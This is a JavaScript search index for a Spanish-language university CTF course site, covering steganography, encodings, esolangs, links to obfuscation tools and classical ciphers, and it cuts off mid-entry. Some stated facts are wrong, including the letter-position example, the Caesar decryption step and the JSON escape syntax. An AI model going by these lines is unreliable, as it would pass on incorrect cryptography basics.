var suggestions=document.getElementById('suggestions');var userinput=document.getElementById('userinput');document.addEventListener('keydown',inputFocus);function inputFocus(e){if(e.keyCode===191){e.preventDefault();userinput.focus();}
if(e.keyCode===27){userinput.blur();suggestions.classList.add('d-none');}}
document.addEventListener('click',function(event){var isClickInsideElement=suggestions.contains(event.target);if(!isClickInsideElement){suggestions.classList.add('d-none');}});document.addEventListener('keydown',suggestionFocus);function suggestionFocus(e){const focusableSuggestions=suggestions.querySelectorAll('a');const focusable=[...focusableSuggestions];const index=focusable.indexOf(document.activeElement);let nextIndex=0;if(e.keyCode===38){e.preventDefault();nextIndex=index>0?index-1:0;focusableSuggestions[nextIndex].focus();}
else if(e.keyCode===40){e.preventDefault();nextIndex=index+1<focusable.length?index+1:index;focusableSuggestions[nextIndex].focus();}}
(function(){var index=new FlexSearch({preset:'score',cache:true,doc:{id:'id',field:['title','description','content',],store:['href','title','description',],},});var docs=[{id:0,href:"/docs/prologo/intro/",title:"Prólogo",description:null,content:"\u003cp\u003eEste apunte recoge los contenidos planificados para el curso \u003cstrong\u003eCC5325 - Taller de Hacking Competitivo\u003c/strong\u003e del \u003ca href=\"https://dcc.uchile.cl\"\u003eDepartamento de Ciencias de la Computación\u003c/a\u003e de la \u003ca href=\"https://ingenieria.uchile.cl\"\u003eFacultad de Ciencias Físicas y Matemáticas\u003c/a\u003e de la \u003ca href=\"https://uchile.cl\"\u003eUniversidad de Chile\u003c/a\u003e. El objetivo de este curso es entregar a el o la estudiante las herramientas básicas necesarias para introducirse en el mundo de competencias y desafíos de ciberseguridad, además de motivarle a conocer más varios conceptos relacionados con ciberseguridad en el mundo profesional.\u003c/p\u003e\n\u003cp\u003eEste apunte también funciona como un documento vivo, en el que se le invita a quienes lo leen a modificarlo, copiarlo y/o a aportar con pull requests nuevas secciones, ejemplos y ejercicios.\u003c/p\u003e\n\u003cp\u003eEl apunte está basado en muchas fuentes de información disponibles en Internet, así como también algunos libros relacionados al tema. Estos documentos se citan en el anexo Referencias.\u003c/p\u003e\n\u003ch2 id=\"por-donde-partir\"\u003e¿Por donde partir?\u003c/h2\u003e\n\u003cp\u003eEn caso que no estés tomando el curso, te recomendamos seguir estos pasos para aprovechar el apunte:\u003c/p\u003e\n\u003ch3 id=\"contenido-del-curso\"\u003eContenido del curso\u003c/h3\u003e\n\u003cp\u003eLos capítulos de la barra lateral se muestran en el orden que se planean abordar en el curso. Por lo tanto, es recomendable seguirlos en ese mismo orden.\u003c/p\u003e\n\u003ch3 id=\"preparación-del-entorno-de-trabajo\"\u003ePreparación del entorno de trabajo\u003c/h3\u003e\n\u003cp\u003ePara preparar el entorno de trabajo, recomendamos revisar los anexos \u0026ldquo;Kali Linux\u0026rdquo; y \u0026ldquo;VPN\u0026rdquo;.\u003c/p\u003e\n\u003ch3 id=\"cuál-es-la-flag-del-examen\"\u003e¿Cuál es la flag del examen?\u003c/h3\u003e\n\u003cp\u003eTe puedo decir cuál no es la flag del examen: CC5325{3stA_n0_e5_l4_fl4g}\u003c/p\u003e\n"},{id:1,href:"/docs/stego/",title:"Esteganografía",description:"Ocultar información en imágenes, sonidos y archivos de texto.",content:""},{id:2,href:"/docs/stego/intro/",title:"Intro a la Esteganografía",description:null,content:"\u003cp\u003eLa esteganografía corresponde a la práctica de esconder un mensaje dentro de otro mensaje u objeto, de forma que a simple vista no se sepa la existencia del mensaje oculto (o en algunos casos, que ni si quiera sea posible demostrarla).\u003c/p\u003e\n\u003cp\u003eEn los problemas de CTF, estos corresponden a los desafíos más \u0026ldquo;fáciles\u0026rdquo; en términos de conocimientos requeridos para resolverlos. Sin embargo, la dificultad de resolución puede variar bastante según las herramientas usadas para esconder y obtener el mensaje y los conocimientos transversales de distintas tecnologías y cifrados de quien participa en el CTF.\u003c/p\u003e\n\u003cp\u003eEsta unidad partirá explicando algunos conceptos que, si bien no califican como esteganografía, se usan bastante en problemas de CTF, y en especial en problemas de esta categoría. El detalle de estos conceptos está en la sección \u003cstrong\u003eConceptos Básicos\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eAdemás, solo para efectos de este curso, consideraremos también los contenidos de \u003cstrong\u003eCriptografía Clásica\u003c/strong\u003e como parte de la unidad de esteganografía. Los problemas de criptografía clásica requieren tener conocimiento de un gran número de cifradores clásicos usados en la historia, así como también de herramientas de computador que permitan romper los cifrados de forma rápida y eficiente. Algunas de estas herramientas ya están implementadas y públicas en sitios web, mientras que otras probablemente deban ser implementadas por nosotrxs mismxs.\u003c/p\u003e\n\u003cp\u003eLa segunda mitad del capítulo trata de casos de esteganografía concretos. Cada sección se divide en un tipo común de esteganografía, entre ellos la esteganografía en texto, en imagenes y en audio.\u003c/p\u003e\n"},{id:3,href:"/docs/stego/conceptos-basicos/",title:"Conceptos Básicos",description:null,content:"\u003cp\u003eEn términos generales, para poder comunicar un valor entre un emisor y un receptor, es necesario que ambas partes se comuniquen mediante un lenguaje en común. En el caso de computadores, esta información se encuentra \u0026ldquo;codificada\u0026rdquo; en algún formato. Hay formatos y representaciones de datos comunes y estandarizadas, mientras que hay otras más esotéricas.\u003c/p\u003e\n\u003ch2 id=\"codificaciones\"\u003eCodificaciones\u003c/h2\u003e\n\u003cp\u003eEn los computadores que usamos todos los días, la mínima unidad de información posible de guardar es un \u003cstrong\u003eBit\u003c/strong\u003e. La costumbre indica que ocho bits forman un \u003cstrong\u003eByte\u003c/strong\u003e (B) u octeto. Además, 1024 bytes son un \u003cstrong\u003eKibibyte\u003c/strong\u003e (KiB), 1024 kibibytes son un \u003cstrong\u003emebibyte\u003c/strong\u003e (MiB), 1024 mebibytes son un \u003cstrong\u003egibibyte\u003c/strong\u003e (GiB)\u003c/p\u003e\n\u003cp\u003eLa información de un byte se puede suele de alguna de las formas siguientes:\u003c/p\u003e\n\u003ch3 id=\"binario\"\u003eBinario\u003c/h3\u003e\n\u003cp\u003eCon 8 dígitos entre 0 y 1 es posible representar cualquier byte en base binaria. Asumiendo que las cifras menos significativas están a la derecha, un número en representación binaria tendría la siguiente estructura:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e2⁷ 2⁶ 2⁵ 2⁴ 2³ 2² 2¹ 2⁰\nS  T  U  V  W  X  Y  Z\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eRecordando que las variables $[S..Z]$ corresponden a un valor en $[0..1]$, el número de arriba equivale al resultado de la fórmula $S2⁷ + T2⁶ + U2⁵ + V2⁴ + W2³ + X2² + Y2¹ + Z2⁰$\u003c/p\u003e\n\u003ch3 id=\"octal\"\u003eOctal\u003c/h3\u003e\n\u003cp\u003eSimilar al caso anterior, pero ahora son 3 dígitos con valores entre $[0..7]$:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e8² 8¹ 8⁰\nX  Y  Z\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eEl número anterior es igual a $X8² + Y8¹ + Z8⁰$.\u003c/p\u003e\n\u003ch3 id=\"hexadecimal\"\u003eHexadecimal\u003c/h3\u003e\n\u003cp\u003eEn este caso, cada dígito representa un número entre el $0$ y el $15$. Los dígitos asignados a los valores $10, 11, 12, 13, 14, 15$ son simbolizados con las letras $A, B, C, D, E, F$ respectivamente:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e16¹ 16⁰\nY   Z\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eEl número anterior es igual a $Y16¹ + Z16⁰$.\u003c/p\u003e\n\u003ch3 id=\"múltiples-bytes\"\u003eMúltiples bytes\u003c/h3\u003e\n\u003cp\u003ePara representar múltiples bytes seguidos en una codificación de las anteriores, basta con concatenarlos uno luego del otro, ya sea con un separador específico (espacio, coma, etc) o sin usar separadores, aprovechándose que el largo de cada byte en dígitos es constante en cada caso (8 en bytes, 3 en octal, 2 en hexadecimal).\u003c/p\u003e\n\u003ch3 id=\"codificaciones-de-texto\"\u003eCodificaciones de texto\u003c/h3\u003e\n\u003cp\u003ePara que la comunicación entre ambas partes tenga sentido, es necesario establecer un estándar de cómo representar cada símbolo que se desea utilizar. En CTFs y por simplicidad, el estándar que se suele utilizar es ASCII, en el cual cada caracter se define en 7 bits (aunque se sigue guardando en un número de 8 bits):\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://www.asciitable.com/index/asciifull.gif\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eCon lo anterior, es posible representar una gran cantidad de textos en inglés. Sin embargo, a veces se requieren caracteres extendidos, para lo cual se usa otra codificación denominada ISO-8859-1. Esta usa los 8 bits del byte y permite escribir en otros lenguajes, como por ejemplo, español.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://www.asciitable.com/index/extend.gif\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"textos-escapados\"\u003eTextos Escapados\u003c/h3\u003e\n\u003cp\u003eEn algunas ocasiones, introducir un texto \u0026ldquo;tal cual\u0026rdquo; como lo usamos generalmente suele traer problemas, en especial porque algunos caracteres pueden encontrarse reservados en el contexto en el que queremos usarlos. A continuación mostramos algunas formas comunes de \u0026ldquo;escapar textos\u0026rdquo;.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePercent-Encoding\u003c/strong\u003e: También conocido como \u003ca href=\"https://en.wikipedia.org/wiki/Percent-encoding#Percent-encoding_reserved_characters\"\u003ecodificación de URLs\u003c/a\u003e, codifica algunos caracteres \u0026ldquo;reservados\u0026rdquo; de las URL con su representación binaria en ASCII, precedida de un signo \u0026ldquo;%\u0026rdquo;. Esta es la razón por la que cuando una URL tiene un espacio, suele transformarse en \u0026lsquo;%20\u0026rsquo; (el código hexadecimal del caracter espacio es 0x20). Para ver los casos en los que esto ocurre, revisar el link enlazado en este párrafo.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBinario en JSON\u003c/strong\u003e: Cuando un campo de texto en JSON contiene datos no representables con un caracter, se suelen codificar con la cadena de texto \u003ccode\u003e/uWXYZ\u003c/code\u003e, donde W, X, Y y Z son caracteres hexadecimales, los cuales representan la codificación de un caracter \u003ca href=\"https://www.ietf.org/rfc/rfc4627.txt\"\u003eUTF-8\u003c/a\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"codificaciones-de-texto-a-binario\"\u003eCodificaciones de texto a binario\u003c/h3\u003e\n\u003cp\u003eCuando queremos transmitir datos arbitrarios (generalmente binarios) por un medio que solamente acepta una cantidad limitada de caracteres, se suele usar alguna de las siguientes codificaciones:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Base64\"\u003e\u003cstrong\u003eBase64\u003c/strong\u003e\u003c/a\u003e: Codifica bytes arbitrarios utilizando solo los caracteres ${A..Z,a..z,0..9,+,/,=}$ (el signo = solo al final, usado como padding.). Se suele utilizar para codificar archivos binarios en la web (imágenes y PDF, por ejemplo). Se representa cada conjunto de 6 bits ($2^6 = 64$) con un caracter del alfabeto de Base64. También existen versiones URL-Friendly, donde se reemplaza el + y el / por - y _, respectivamente.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Base32\"\u003e\u003cstrong\u003eBase32\u003c/strong\u003e\u003c/a\u003e: Mismo concepto que Base64, pero con menos caracteres, por lo que cada caracter codifica 5 bits solamente. El alfabeto completo es ${A..Z,2..7}$, con la posibilidad de usar = como padding al igual que en base64. También existen versiones con otros alfabetos, de las cuales varias se detallan en el enlace respectivo.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Binary-to-text_encoding#Base58\"\u003e\u003cstrong\u003eBase58 y otras\u003c/strong\u003e\u003c/a\u003e: Base58 es muy parecido a Base64, pero sin los caracteres ${+,/,0,I,O,L}$. Usado fundamentalmente como codificación de direcciones públicas en Bitcoin. El enlace menciona otras codificaciones conocidas de texto a binario.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"codificación-en-lenguajes-de-programación-esotéricos-esolangs\"\u003eCodificación en Lenguajes de Programación Esotéricos (Esolangs)\u003c/h2\u003e\n\u003cp\u003eEn algunos CTF se codifican mensajes utilizando \u003ca href=\"https://en.wikipedia.org/wiki/Esoteric_programming_language\"\u003e\u003cstrong\u003elenguajes de programación esotéricos\u003c/strong\u003e (esolangs)\u003c/a\u003e. A continuación mencionamos algunos conocidos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Brainfuck\"\u003e\u003cstrong\u003eBrainf*ck\u003c/strong\u003e\u003c/a\u003e: Lenguaje de programación minimalista que tiene solamente 8 comandos, representados por 8 caracteres: $[+;-;[;];\u0026gt;;\u0026lt;;.;,]$. En caso de ver un texto con esos símbolos, puede ser necesario correrlo con un intérprete del lenguaje, como \u003ca href=\"https://franklin.dyer.me/htmlpage/brainfuck.html\"\u003eeste\u003c/a\u003e. Otro enlace útil es \u003ca href=\"https://fatiherikli.github.io/brainfuck-visualizer/\"\u003eeste\u003c/a\u003e, el cual muestra paso a paso la interpretación de un programa en Brainf*ck.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://www.bertnase.de/npiet/\"\u003e\u003cstrong\u003ePiet\u003c/strong\u003e\u003c/a\u003e: Lenguaje de programación cuyos archivos interpretables son imágenes\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://naokikp.github.io/wsi/whitespace.html\"\u003e\u003cstrong\u003eWhitespace\u003c/strong\u003e\u003c/a\u003e: El intérprete considera solamente los simbolos espacio, tab y enter en un archivo de texto, lo que es bastante útil para esconder programas dentro de un archivo aparentemente inofensivo.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://www.emojicode.org/\"\u003e\u003cstrong\u003eEmojiCode\u003c/strong\u003e\u003c/a\u003e: Un lenguaje de programación donde todas las instrucciones y keywords corresponden a emojis.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"ofuscación-de-código\"\u003eOfuscación de código\u003c/h3\u003e\n\u003cp\u003eEn otros casos, el CTF puede requerir desofuscar una línea de código, para lo cual se usan características propias de cada lenguaje para dificultar entender qué es lo que se está ejecutando, lo que afecta tanto a personas como a programas que detectan scripts maliciosos. A continuación mostramos algunos programas que ayudan a ofuscar código:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Bashfuscator/Bashfuscator\"\u003eBashfuscator (Bash)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/danielbohannon/Invoke-Obfuscation\"\u003eInvoke-Obfuscation (Powershell)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.obfuscator.io/\"\u003eobfuscator.io (Javascript)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAsí como existen ofuscadores, también hay utilidades que permiten desofuscar código:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://lelinhtinh.github.io/de4js/\"\u003ede4js (Javascript)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jsnice.org\"\u003ejsnice\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEn otros casos más complejos, puede convenir usar un depurador de código e ir analizando lo que produce el script línea por línea.\u003c/p\u003e\n\u003ch2 id=\"algunas-codificaciones-esotéricas\"\u003eAlgunas Codificaciones \u0026ldquo;esotéricas\u0026rdquo;\u003c/h2\u003e\n\u003cp\u003eHay una cantidad innumerable de formas de codificar datos en uso actualmente, muchas de las cuales pertenecen a nichos determinados. A continuación mencionamos unas pocas, solo para ejemplificar la variedad que se suele utilizar en problemas de CTF.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling\"\u003e\u003cstrong\u003eDTMF\u003c/strong\u003e\u003c/a\u003e: Siglas de \u003cem\u003eDual-tone Multi-frequency Signaling\u003c/em\u003e, es el sistema de señales que usan los teléfonos fijos hasta el día de hoy. Se basa en la asignación de un tono específico a cada fila y columna de una matriz de 4x4, en la cual se colocan los números de marcado de estos teléfonos. Para determinar cuál es la tecla que se presiona, se calcula la fila y la columna del sonido que esta emite según su tono. A continuación, se muestra la matriz para calcular estos valores.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"../dtmf.jpg\" alt=\"\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Cistercian_numerals\"\u003e\u003cstrong\u003eNumerales Cistercios\u003c/strong\u003e\u003c/a\u003e: Popularizados por un libro de difusión científica del 2001 titulado \u003ca href=\"https://en.wikipedia.org/wiki/The_Ciphers_of_the_Monks\"\u003e\u0026ldquo;Las cifras de los Monjes\u0026rdquo;\u003c/a\u003e y escrito por David A. King, corresponden a una forma de escribir números de entre el 0 y el 9999 con un solo glifo. La siguiente imagen (creada por el usuario de Wikipedia \u003ca href=\"https://commons.wikimedia.org/w/index.php?title=User:Meteoorkip\u0026amp;action=edit\u0026amp;redlink=1\"\u003eMeteoorkip\u003c/a\u003e) muestra como formar números con esta codificación, tomando una componente de cada fila para formar el valor de 4 dígitos decimales.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"https://upload.wikimedia.org/wikipedia/commons/6/67/Cistercian_digits_%28vertical%29.svg\" alt=\"Imagen por Meteoorkip en Wikimedia Commons\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"\"\u003e\u003cstrong\u003eCódigo morse\u003c/strong\u003e\u003c/a\u003e: El código morse fue inventado por Samuel Morse como codificación para su uso en el Telégrafo, otro invento de la misma persona. Este código consiste en la codificación de letras en 3 diferentes señales: puntos (tonos cortos), rayas (tonos largos) y pausas (tiempo sin tonos). A continuación se muestran las codificaciones para cada letra.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"../morse_code.svg\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch2 id=\"herramientas-para-transformar-codificaciones\"\u003eHerramientas para transformar codificaciones\u003c/h2\u003e\n\u003cp\u003eA continuación se enumeran algunas herramientas útiles para decodificar algunas codificaciones conocidas. Su uso se verá a lo largo del ramo.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://gchq.github.io/CyberChef/\"\u003eCyberchef\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/en\"\u003eDcode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://cryptii.com/\"\u003eCryptii\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:4,href:"/docs/stego/cripto-clasica/",title:"Criptografía Clásica",description:null,content:"\u003cp\u003eLos cifradores clásicos son aquellos que han tenido un uso histórico masivo, pero que hoy en día no se utilizan, en parte debido a lo fácil que resulta romperlos con ayuda de un computador.  Además, estos cifradores suelen trabajar solamente con letras del alfabeto inglés, lo que limita los tipos de mensajes que se pueden cifrar.\u003c/p\u003e\n\u003cp\u003eEn general, al usar estos cifrados \u003cstrong\u003ese ignoran los espacios y signos de puntuación\u003c/strong\u003e, entregándose como mensaje cifrado un texto sin estos símbolos, los cuales generalmente se pueden recuperar interpretando el mensaje en texto plano.\u003c/p\u003e\n\u003ch2 id=\"cifradores-de-sustitución\"\u003eCifradores de Sustitución\u003c/h2\u003e\n\u003cp\u003eCorresponde a los cifradores en los que para cifrar mensajes, cada caracter de ellos es reemplazado por otro caracter según una función de sustitución específica, pero manteniendo su posición en el texto. Para descifrar los mensajes, basta con aplicar la función inversa a cada caracter.\u003c/p\u003e\n\u003ch3 id=\"cifrador-césar-caesar-cipher\"\u003eCifrador César (Caesar Cipher)\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../caesar.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eEn el cifrador César, la sustitución es definida por una llave $K$, equivalente a un número entre 1 y 26, o en su defecto, a una letra del alfabeto con el que se trabaja (el inglés). Para cifrar, es necesario interpretar cada letra como un número igual a la posición de esta en el abecedario. Luego, a este valor se le suma $K$ (o si $K$ es una letra, su posición en el abecedario). Si el valor de la suma es mayor a 26, se le resta 26 para obtener un número dentro del rango 1 y 26. Finalmente, este número es transformado en la letra del abecedario que se encuentra en esa posición.\u003c/p\u003e\n\u003cp\u003eEl descifrado de un mensaje cifrado con César es similar a su cifrado, pero en vez de sumar se resta 26. Si el número resultante es menor a 1, se le suma 26 para obtener un número en el rango de entre 1 y 26.\u003c/p\u003e\n\u003ch4 id=\"caso-particular-rot13\"\u003eCaso particular: ROT13\u003c/h4\u003e\n\u003cp\u003eExiste un caso particular del cifrador César conocido como \u0026ldquo;ROT13\u0026rdquo;, en el cual la llave es fija y de valor 13 (o \u0026ldquo;M\u0026rdquo;). Lo más útil de tener este valor como llave es que para el proceso de cifrado y descifrado se puede usar exactamente el mismo algoritmo. Dado que la llave es un valor fijo, se suele considerar más como una técnica de ofuscación que de cifrado, la cual es bastante popular por ejemplo en foros de discusión de internet para publicar \u003cem\u003espoilers\u003c/em\u003e.\u003c/p\u003e\n\u003ch4 id=\"cómo-romper-caesar\"\u003eCómo romper Caesar\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eFuerza bruta\u003c/strong\u003e: Calcular para cada llave posible el valor del texto descifrado con esa llave. Luego, seleccionar el valor de salida más coherente. Como son solo 26 llaves posibles, es fácil de realizar.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnálisis de frecuencias\u003c/strong\u003e: En todos los idiomas, \u003ca href=\"https://en.wikipedia.org/wiki/Letter_frequency\"\u003ees posible encontrar una proporción estandar de frecuencias para cada letra del alfabeto\u003c/a\u003e. En el caso del inglés, la letra más repetida es la $E$. Por lo tanto, en el caso de textos largos, podemos revisar cuál es el caracter con más repeticiones y asumir que equivale a la E. Luego, calculamos la llave que necesitaríamos para convertir ese caracter en una E. Finalmente, probamos la llave candidata y revisamos la obtención de un mensaje coherente. Este análisis también puede considerar las frecuencias de otras letras para aumentar la confianza en el resultado.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEste gráfico muestra las frecuencias relativas de las 26 letras del abecedario inglés:\n\u003cimg src=\"../letter_frequency.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"herramientas\"\u003eHerramientas\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/caesar-cipher\"\u003eDCode.fr\u003c/a\u003e tiene una utilidad para romper Caesar por fuerza bruta, el cual calcula probabilidad de éxito con un análisis de frecuencias.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"cifrador-vigenère\"\u003eCifrador Vigenère\u003c/h3\u003e\n\u003cp\u003eEn el caso del cifrador \u003ca href=\"https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher\"\u003eVigenère\u003c/a\u003e, creado en el año 1553 pero roto recién en el año 1863, la sustitución se hace con llaves alfanuméricas de largo arbitrario, aunque generalmente menor al largo del texto completo. El algoritmo de cifrado es el siguiente:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDefinimos la función $ToPos(Z)$, que toma una letra del abecedario inglés $Z$ y la transforma en un número equivalente a su posición en él.\n\u003cul\u003e\n\u003cli\u003eEjemplos: $ToPos(\u0026ldquo;a\u0026rdquo;) = 1$, $ToPos(\u0026ldquo;n\u0026rdquo;) = 19$, $ToPos(\u0026ldquo;z\u0026rdquo;) = 26$\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eDefinimos la función $ToChar(N)$, que toma un número $N$ entre 1 y 26, y devuelve la letra del abecedario inglés en esa posición.\n\u003cul\u003e\n\u003cli\u003eEjemplos: $ToChar(1) = \u0026ldquo;a\u0026rdquo;$, $ToChar(19) = \u0026ldquo;n\u0026rdquo;$, $ToChar(26) = \u0026ldquo;z\u0026rdquo;$\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eDada una llave $K$ de largo $n$ y un texto de largo $N$, para cada caracter $P[i]$ del texto plano P, obtenemos $C[i]$ de la siguiente forma:\n\u003cul\u003e\n\u003cli\u003eDefinimos $C[i]$ como $ToChar((ToPos(P[i]) + K_i) \\mod 26) + 1$\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEsto hace notar que Caesar es un caso particular de Vigenère con una llave de largo 1.\u003c/p\u003e\n\u003ch4 id=\"cómo-romper-vigenère\"\u003eCómo romper Vigenère\u003c/h4\u003e\n\u003cp\u003eLas técnicas de Caesar no sirven directamente en el caso de Vigenere, dado que el universo de llaves posibles no está acotado, y que un análisis de frecuencias por sí solo no nos revelará mucha información. Sin embargo, existen técnicas un poco más sofisticadas que nos ayudarán a obtener el mensaje cifrado o la llave utilizada.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Kasiski_examination\"\u003e\u003cstrong\u003eExaminación de Kasiski\u003c/strong\u003e\u003c/a\u003e: Técnica de criptoanálisis que permite determinar un subconjunto de posibles largos de llave. Posteriormente, es posible hacer un análisis de frecuencia independiente para cada caracter de la llave, considerando solamente los caracteres del mensaje cifrado que utilizaron ese caracter al cifrarse.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEliminación de la llave\u003c/strong\u003e: En caso que se conozca parte del texto plano, es posible determinar la llave utilizada de forma bastante directa. Recomendamos ver la explicación de la \u003ca href=\"https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher\"\u003epágina en Wikipedia\u003c/a\u003e del cifrador Vigenère (sección \u003cem\u003eCryptanalysis / Key Elimination\u003c/em\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"herramientas-1\"\u003eHerramientas\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/vigenere-cipher\"\u003eDCode.fr\u003c/a\u003e tiene una utilidad que permite romper Vigenère con varias técnicas, algunas de ellas mencionadas acá.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"sustitución-monoalfabética\"\u003eSustitución monoalfabética\u003c/h3\u003e\n\u003cp\u003eLa sustitución monoalfabética considera utilizar una permutación del alfabeto inglés ordenado, y mapear cada letra del alfabeto original a la letra en la misma posición de la permutación. El descifrado es simplemente ejecutar el mapeo opuesto al utilizado en el cifrado. En este caso, la llave correspondería a la permutación completa del alfabeto. Por ejemplo, teniendo la siguiente permutación para el alfabeto ordenado\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eOriginal:    ABCDEFGHIJKLMNOPQRSTUVWXYZ\nPermutación: QWERTYUIOPASDFGHJKLZXCVBNM\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLa versión cifrada del mensaje \u003ccode\u003eHOLA MUNDO\u003c/code\u003e correspondería a \u003ccode\u003eIGSQ DXFRG\u003c/code\u003e.\u003c/p\u003e\n\u003ch4 id=\"ataques-a-la-sustitución-monoalfabética\"\u003eAtaques a la sustitución monoalfabética\u003c/h4\u003e\n\u003cp\u003eEl ataque más efectivo contra la sustitución monoalfabética es el mismo análisis de frecuencias realizado en Caesar, para luego ir probando con la modificación de otras letras de modo de obtener un mensaje coherente.\u003c/p\u003e\n\u003ch4 id=\"herramientas-2\"\u003eHerramientas\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/monoalphabetic-substitution\"\u003eDCode.fr\u003c/a\u003e tiene una herramienta interactiva para realizar sustitución monoalfabética, la cual configura el estado inicial de la sustitución usando análisis de frecuencia, pero permite modificar las sustituciones manualmente, viendo en tiempo real el resultado de ellas.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"cifradores-de-transposición\"\u003eCifradores de Transposición\u003c/h2\u003e\n\u003cp\u003eEn los cifradores de transposición, el texto cifrado corresponde a una permutación de los caracteres del texto plano, la cual se \u0026ldquo;descifra\u0026rdquo; conociendo el orden deben leerse los caracteres para extraer la información cifrada. Hay harta información sobre algunos cifradores de transposición famosos en \u003ca href=\"https://en.wikipedia.org/wiki/Transposition_cipher\"\u003eWikipedia\u003c/a\u003e, así como también técnicas para resolverlos.\u003c/p\u003e\n\u003ch3 id=\"herramientas-3\"\u003eHerramientas\u003c/h3\u003e\n\u003cp\u003eDCode tiene herramientas para los siguientes cifradores de transposición:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/transposition-cipher\"\u003eTransposición por fila/columna\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/columnar-transposition-cipher\"\u003eTransposición columnar\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/double-transposition-cipher\"\u003eTransposición Doble\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:5,href:"/docs/stego/stego/",title:"Stego en texto, imágenes y audio",description:null,content:"\u003cp\u003eEste capítulo mostrará algunas técnicas de esteganografía en texto, imágenes y audio. También listaremos las herramientas y algoritmos necesarios para extraer la información, además de 